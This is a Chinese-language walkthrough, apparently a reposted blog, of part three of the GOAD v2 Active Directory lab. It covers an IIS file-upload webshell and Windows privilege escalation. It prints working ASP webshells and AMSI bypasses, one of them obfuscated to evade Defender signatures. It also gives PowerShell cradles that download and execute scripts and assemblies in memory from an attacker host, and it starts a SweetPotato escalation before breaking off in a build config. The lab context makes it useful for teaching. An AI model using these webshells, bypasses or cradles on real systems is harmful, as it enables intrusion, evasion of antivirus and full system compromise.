---
title: 域渗透GOAD(Game Of Active Directory) v2（三）
url: https://buaq.net/go-149028.html
source: unSafe.sh - 不安全
date: 2023-02-13
fetch_date: 2025-10-04T06:27:33.755839
---

# 域渗透GOAD(Game Of Active Directory) v2（三）

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/91aca04e4613c086081461e5fbfc3fbd.jpg)

域渗透GOAD(Game Of Active Directory) v2（三）

因为先知的长度限制，拆成了多个文章获得webshell 然后尝试一些权限提升技巧IIS - webshellhttp://192.168.56.22/Def
*2023-2-12 11:10:0
Author: [xz.aliyun.com(查看原文)](/jump-149028.htm)
阅读量:88
收藏*

---

因为先知的长度限制，拆成了多个文章

获得webshell 然后尝试一些权限提升技巧

## IIS - webshell

* <http://192.168.56.22/Default.aspx> 可以上传文件
* 作者给出了一个小马

```
<%
Function getResult(theParam)
    Dim objSh, objResult
    Set objSh = CreateObject("WScript.Shell")
    Set objResult = objSh.exec(theParam)
    getResult = objResult.StdOut.ReadAll
end Function
%>
<HTML>
    <BODY>
        Enter command:
            <FORM action="" method="POST">
                <input type="text" name="param" size=45 value="<%= myValue %>">
                <input type="submit" value="Run">
            </FORM>
            <p>
        Result :
        <%
        myValue = request("param")
        thisDir = getResult("cmd /c" & myValue)
        Response.Write(thisDir)
        %>
        </p>
        <br>
    </BODY>
</HTML>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230210204943-642d0d82-a941-1.png)

* 我们也可以试一下蚁剑

```
<%Function xxxx(str) eval str End Function%><%D = request("ant")%><%xxxx D%>
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230210204947-6662879e-a941-1.png)

* 作为 IIS 服务用户，我们获得了 SeImpersonatePrivilege 特权！ （mssql也是一样，服务默认有这个权限）

## Privesc (privilege escalation)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230210204952-694f8768-a941-1.png)

* Microsoft Windows 上有很多 privesc 技术。 在这里，我们将尝试两个被微软“未修复”的漏洞，即 **printspoofer** 和 **krbrelay**。
* 由于 privesc 在目标计算机上运行，在本章中我们将执行一些 powershell 来提升我们的权限。

## Printspoofer(potato)

### AMSI bypass

* ****反恶意软件扫描接口**** <https://learn.microsoft.com/zh-cn/windows/win32/amsi/how-amsi-helps>

> 为了进行所有测试，我在所有系统上启用了 Windows Defender。 Castelblack（192.168.56.22） 默认禁用Defender，您应该在测试此处描述的 privesc 技术之前启用它

但我试着好像已经开了？

![](https://xzfile.aliyuncs.com/media/upload/picture/20230210204956-6b872b94-a941-1.png)

* 为了能够从**内存中运行(不落地)**通常会被 AV 检测到的应用程序，您应该绕过当前进程的反恶意软件扫描接口 (AMSI)
* <https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell> <https://amsi.fail/>
* 所有公开可用的方法似乎都已被拦截，但我们也可以选择一个并对其进行一些手动小修改
* 原始

```
# Matt Graebers second Reflection method
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
```

* 修改后

```
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
```

* 这是微不足道的修改，但这足以在撰写本文时绕过防护检测签名。
* 完成后，我们可以使用 rasta mouse AMSI bypass 在 .net 级别禁用 AMSI。
* 如果您想知道为什么必须这样做，您应该阅读@ShitSecure 的这篇博文，其中解释了 powershell 和 .net AMSI 级别之间的区别 <https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/>

```
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

* 启动http服务放置脚本

```
python3 -m http.server 8081
```

```
(new-object system.net.webclient).downloadstring('http://192.168.56.1:8081/amsi_rmouse.txt')|IEX
```

直接在蚁剑里执行，会遇到引号的报错，先弹shell出来

![](https://xzfile.aliyuncs.com/media/upload/picture/20230210205004-708652d2-a941-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230210205006-7182573a-a941-1.png)

依次执行这两条命令

![](https://xzfile.aliyuncs.com/media/upload/picture/20230210205010-744bb696-a941-1.png)

* 一旦我们这样做了，我们就可以在落地的条件下运行我们想要的东西了！ #the\_disk\_is\_lava
* 我们现在可以使用 execute assembly 直接运行我们所有的 .net 应用程序。

### inPeas without touching disk

* 我最喜欢的提权工具是winpeas

[PEASS-ng/winPEAS at master · carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

* 我们已经在上一步中绕过了 amsi，现在我们可以做的就是将 winpeas 放在 http 服务器上并将其加载到内存中来避免检测
* [This article](https://www.praetorian.com/blog/running-a-net-assembly-in-memory-with-meterpreter/) explain very well how to load and run an assembly with powershell full in memory.

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
python3 -m http.server 8081
```

```
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8081/winPEASany_ofs.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```

* WinPeas 需要几分钟才能完成，并返回包含所有信息的提示（在我们的基本 powershell reverseshell 中没有捕获控制台输出为空，
* 如果您不想无聊地编译 .net 应用程序或使用公共类和方法修改它们并且没有 exit.environment，您还可以使用 PowerSharpPack 并为您完成所有工作

```
iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1')
PowerSharpPack -winPEAS
```

* 并且我们得到SEImpersonate Privilege的信息用于提权

返回了一大堆

![](https://xzfile.aliyuncs.com/media/upload/picture/20230210205012-75561aea-a941-1.png)

### Packing your .net binary for powershell

* 如果你不想使用来自互联网的二进制文件（并且你不应该使用在你的 pentest 任务中从 github 上获取的预编译代码），你也可以使用以下脚本打包你自己的二进制文件：<https://gist.github.com/Mayfly277/2e5f34a7e7f70798d1f19c0c35f9fa0e>
* 这个脚本是对来自@snovvcrash 网站<https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/dotnet-reflective-assembly>的脚本和 PowerSharpPack 的一些代码的修改。
* 使用如下命令打包

```
. .\EncodeAssembly.ps1
Invoke-EncodeAssembly -binaryPath winPEAS.exe -namespace winPEAS -capture $true
```

* 要在 powershell 中用作反射程序集，请记住您应该避免在 .net 代码中使用 environment.exit() 并且还必须将类和主要方法设置为 public。

这样自己打包的话 替换上一步中的exe文件即可 我们就不尝试了

### SeImpersonatePrivilege to Authority\system

* 要将具有 SeImpersonatePrivilege 的 iis（或 mssql）用户的权限提升到 Authority\system，我们可以使用其中一种potato技术。
* 一篇精彩的博客文章在这里解释了不同的potato：<https://jlajara.gitlab.io/Potatoes_Windows_Privesc>
* 让我们使用 Sweet Potato，这是所有技术的汇编，“potato统治一切”。

<https://github.com/CCob/SweetPotato>

* ~~好的，我们克隆项目并使用 visualStudio 编译它~~

这里我没有visual studio环境 所以使用的Github Actions在线编译 我的配置如下

```
name: .NET Core Desktop

on:
  push:
    branches: [ "master" ]
  pull_request:
    branches: [ "master" ]

jobs:

  build:

    strategy:
      matrix:
        configuration: [Release]

    runs-on: windows-2019  # For a list of available runner types, refer to https://help.github.com/en/actions/reference/workflow-syntax-for-github-actions#jobsjob_idruns-on
                             # 貌似.net framework(不是core)需要windows-2019

    env:
      Solution_Name: SweetPotato                         # Replace with your solution name, i.e. MyWpfApp.sln.

    steps:
    - name: Checkout
      uses: actions/checkout@v3
      with:
        fetch-depth: 0

    # Install the .NET Core workload
    - name: Install .NET Core
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: 6.0.x

    # Add  MSBuild to the PATH: https://github.com/microsoft/setup-msbuild
    - name: Setup MSBuild.exe
      uses: microsoft/setup-msbuild@v1.0.2

    #...